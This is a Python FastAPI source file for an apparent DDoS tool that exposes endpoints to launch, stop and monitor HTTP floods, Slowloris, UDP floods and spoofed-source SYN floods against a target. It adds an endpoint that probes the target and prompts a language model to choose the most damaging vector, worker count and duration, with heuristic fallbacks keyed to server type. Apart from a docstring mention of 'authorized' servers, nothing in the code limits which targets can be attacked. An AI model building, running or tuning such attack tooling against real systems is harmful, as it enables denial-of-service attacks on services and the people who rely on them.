"""
DDoS / Stress Test API Routes

Provides endpoints to start, stop, and monitor DDoS attacks
against authorized web servers. Includes AI-powered target analysis.
"""

from __future__ import annotations

import logging
import json
from typing import Optional

import httpx
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, field_validator

from tools.ddos_tool import AttackVector, AttackConfig, ddos_engine

logger = logging.getLogger(__name__)

ddos_router = APIRouter(prefix="/api/v1/ddos", tags=["ddos"])


# ─── Request/Response Models ──────────────────────────────────────────────────


class DDoSStartRequest(BaseModel):
    target: str
    vector: str = "http-flood"
    workers: int = 100
    duration: int = 30
    payload_size: int = 1024
    rate_limit: int = 0

    @field_validator("target")
    @classmethod
    def target_not_empty(cls, v: str) -> str:
        if not v or not v.strip():
            raise ValueError("target is required")
        return v.strip()

    @field_validator("vector")
    @classmethod
    def vector_valid(cls, v: str) -> str:
        valid = [av.value for av in AttackVector]
        if v not in valid:
            raise ValueError(f"Invalid vector: {v}, valid: {valid}")
        return v

    @field_validator("workers")
    @classmethod
    def workers_range(cls, v: int) -> int:
        return max(1, min(v, 1000))

    @field_validator("duration")
    @classmethod
    def duration_range(cls, v: int) -> int:
        return max(0, min(v, 3600))


class DDoSStatusResponse(BaseModel):
    running: bool
    requests: int
    bytes_total: int
    pps: float
    mbps: float
    elapsed: float
    success_2xx: int
    redirect_3xx: int
    client_err_4xx: int
    server_err_5xx: int
    errors: int
    vector: Optional[str] = None
    target: Optional[str] = None
    workers: int = 0
    duration: int = 0


class DDoSAttackInfo(BaseModel):
    vector: str
    label: str
    description: str
    requires_root: bool


class TargetAnalysisRequest(BaseModel):
    target: str

    @field_validator("target")
    @classmethod
    def target_not_empty(cls, v: str) -> str:
        v = v.strip()
        if not v:
            raise ValueError("target is required")
        return v


# ─── AI analysis helper ──────────────────────────────────────────────────────

async def _probe_target(target: str) -> dict:
    """Light probe of target server for LLM analysis context."""
    info = {"reachable": False, "server": "unknown", "status": 0, "content_length": 0, "response_time_ms": 0}
    url = target if "://" in target else f"http://{target}"
    try:
        async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
            t0 = __import__("time").time()
            resp = await client.get(url, headers={"User-Agent": "TIRPAN-DDoS-Probe/1.0"})
            info["reachable"] = True
            info["status"] = resp.status_code
            info["server"] = resp.headers.get("Server", "unknown")
            info["content_length"] = len(resp.content)
            info["response_time_ms"] = round((__import__("time").time() - t0) * 1000, 1)
            info["headers"] = dict(resp.headers)
    except Exception as e:
        info["error"] = str(e)
    return info


def _get_provider_config() -> dict:
    """Read provider config from the global settings."""
    try:
        from config import settings
        return {
            "provider": settings.llm.provider,
            "ollama_url": settings.ollama.base_url,
            "ollama_model": settings.ollama.model,
            "lmstudio_url": settings.lmstudio.base_url,
            "openrouter_key": bool(settings.llm.api_key),
        }
    except Exception:
        return {"provider": "none"}


def _build_analysis_prompt(target: str, probe: dict) -> str:
    """Build LLM prompt for target analysis."""
    return f"""You are a network stress-test specialist. Analyze this target for optimal DDoS testing:

TARGET: {target}
SERVER: {probe.get('server', 'unknown')}
STATUS: {probe.get('status', 'N/A')}
RESPONSE TIME: {probe.get('response_time_ms', 'N/A')}ms
CONTENT LENGTH: {probe.get('content_length', 0)} bytes
HEADERS: {json.dumps(probe.get('headers', {}), default=str)[:2000]}

Based on the server type, response characteristics, and content length:
1. Recommend the best attack vector (http-flood, http-post, slowloris, udp-flood, syn-flood, mixed)
2. Suggest optimal worker count (50-500)
3. Suggest attack duration (15-120 seconds)
4. Explain your reasoning briefly

Return ONLY valid JSON in this format:
{{"vector":"http-flood","workers":100,"duration":30,"reasoning":"explanation"}}"""


# ─── Endpoints ────────────────────────────────────────────────────────────────


@ddos_router.post("/start", response_model=DDoSStatusResponse)
async def start_attack(req: DDoSStartRequest):
    """Start a DDoS / stress test attack against a target."""
    cfg = AttackConfig(
        target=req.target,
        vector=AttackVector(req.vector),
        workers=req.workers,
        duration=req.duration,
        payload_size=req.payload_size,
        rate_limit=req.rate_limit,
    )
    err = await ddos_engine.start(cfg)
    if err:
        raise HTTPException(status_code=400, detail=err)
    return DDoSStatusResponse(**ddos_engine.get_status())


@ddos_router.post("/stop")
async def stop_attack():
    """Stop the currently running DDoS attack."""
    err = await ddos_engine.stop()
    if err:
        raise HTTPException(status_code=400, detail=err)
    return {"success": True, "message": "Attack stopped"}


@ddos_router.get("/status", response_model=DDoSStatusResponse)
async def get_status():
    """Get the current DDoS attack status and stats."""
    status = ddos_engine.get_status()
    return DDoSStatusResponse(**status)


@ddos_router.get("/attacks")
async def list_attacks():
    """List available DDoS attack vectors."""
    attacks = [
        DDoSAttackInfo(
            vector="http-flood",
            label="HTTP GET Flood",
            description="High-volume HTTP GET requests to overwhelm the web server.",
            requires_root=False,
        ),
        DDoSAttackInfo(
            vector="http-post",
            label="HTTP POST Flood",
            description="HTTP POST requests with large payloads to exhaust server resources.",
            requires_root=False,
        ),
        DDoSAttackInfo(
            vector="slowloris",
            label="Slowloris / Slow HTTP",
            description="Holds connections open with incomplete HTTP headers, exhausting the connection pool.",
            requires_root=False,
        ),
        DDoSAttackInfo(
            vector="udp-flood",
            label="UDP Flood",
            description="High-volume UDP datagrams to saturate network bandwidth.",
            requires_root=False,
        ),
        DDoSAttackInfo(
            vector="syn-flood",
            label="TCP SYN Flood",
            description="TCP SYN packets with spoofed source IPs to exhaust connection queue (requires root).",
            requires_root=True,
        ),
        DDoSAttackInfo(
            vector="mixed",
            label="Mixed Mode",
            description="Combines HTTP flood, Slowloris, and UDP flood simultaneously.",
            requires_root=False,
        ),
    ]
    return {"attacks": [a.model_dump() for a in attacks]}


@ddos_router.post("/ai-analyze")
async def ai_analyze(req: TargetAnalysisRequest):
    """AI-powered target analysis — probes the target and calls the LLM for recommendations."""
    probe = await _probe_target(req.target)

    provider_cfg = _get_provider_config()
    provider = provider_cfg.get("provider", "none")

    if provider == "none":
        return {
            "probe": probe,
            "recommendation": _fallback_recommendation(probe),
            "ai_used": False,
            "note": "No AI provider configured. Using heuristic fallback.",
        }

    # Build prompt and call LLM
    prompt = _build_analysis_prompt(req.target, probe)

    try:
        llm_response = await _call_llm(provider, provider_cfg, prompt)
        rec = _parse_llm_response(llm_response)
        return {
            "probe": probe,
            "recommendation": rec,
            "ai_used": True,
            "provider": provider,
            "raw_response": llm_response[:1000],
        }
    except Exception as e:
        logger.warning("AI analysis failed: %s, using fallback", e)
        return {
            "probe": probe,
            "recommendation": _fallback_recommendation(probe),
            "ai_used": False,
            "error": str(e),
            "note": "LLM call failed, using heuristic fallback.",
        }


async def _call_llm(provider: str, cfg: dict, prompt: str) -> str:
    """Call the configured LLM provider."""
    if provider == "ollama":
        url = f"{cfg['ollama_url'].rstrip('/')}/api/generate"
        model = cfg.get("ollama_model") or await _get_ollama_model(cfg["ollama_url"])
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.post(url, json={
                "model": model,
                "prompt": prompt,
                "stream": False,
                "options": {"num_predict": 256},
            })
            return resp.json().get("response", "")

    elif provider == "lmstudio":
        url = f"{cfg['lmstudio_url'].rstrip('/')}/v1/completions"
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.post(url, json={
                "prompt": prompt,
                "max_tokens": 256,
                "temperature": 0.3,
            })
            return resp.json().get("choices", [{}])[0].get("text", "")

    elif provider == "openrouter":
        raise ValueError("OpenRouter analysis not yet implemented in DDoS panel. Use chat agent instead.")

    raise ValueError(f"Unknown provider: {provider}")


async def _get_ollama_model(base_url: str) -> str:
    """Fetch first available model from Ollama."""
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(f"{base_url.rstrip('/')}/api/tags")
            models = resp.json().get("models", [])
            if models:
                return models[0]["name"]
    except Exception:
        pass
    return "llama3"


def _parse_llm_response(text: str) -> dict:
    """Parse LLM JSON response, extracting the recommendation."""
    import re
    # Try to extract JSON block
    json_match = re.search(r'\{[^{}]*"vector"[^{}]*\}', text, re.DOTALL)
    if json_match:
        try:
            rec = json.loads(json_match.group())
            return {
                "vector": rec.get("vector", "http-flood"),
                "workers": int(rec.get("workers", 100)),
                "duration": int(rec.get("duration", 30)),
                "reasoning": rec.get("reasoning", ""),
            }
        except json.JSONDecodeError:
            pass
    # Fallback: scan text for suggestions
    return {
        "vector": "http-flood",
        "workers": 100,
        "duration": 30,
        "reasoning": text.strip()[:300],
    }


def _fallback_recommendation(probe: dict) -> dict:
    """Heuristic recommendation when AI is unavailable."""
    server = probe.get("server", "").lower()
    status = probe.get("status", 0)
    resp_time = probe.get("response_time_ms", 0)
    content_length = probe.get("content_length", 0)

    if not probe.get("reachable"):
        return {"vector": "udp-flood", "workers": 200, "duration": 60, "reasoning": "Target unreachable via HTTP — try UDP flood to test network layer."}

    if "apache" in server or "nginx" in server:
        if resp_time < 50:
            rec = {"vector": "http-flood", "workers": 300, "duration": 60, "reasoning": f"{server} server responding fast (<50ms) — HTTP GET flood to saturate processing."}
        else:
            rec = {"vector": "slowloris", "workers": 150, "duration": 90, "reasoning": f"{server} with slow response — Slowloris to exhaust connection pool."}
    elif "iis" in server or "microsoft" in server:
        rec = {"vector": "http-flood", "workers": 200, "duration": 45, "reasoning": "IIS detected — HTTP flood with moderate workers."}
    elif content_length > 100000:
        rec = {"vector": "http-post", "workers": 100, "duration": 60, "reasoning": f"Large content ({content_length // 1024}KB) — POST flood to exhaust resources."}
    elif status >= 500:
        rec = {"vector": "slowloris", "workers": 100, "duration": 60, "reasoning": "Server returning 5xx — Slowloris to test connection pool limits."}
    else:
        rec = {"vector": "http-flood", "workers": 150, "duration": 30, "reasoning": "Generic HTTP server — standard HTTP GET flood."}

    return rec
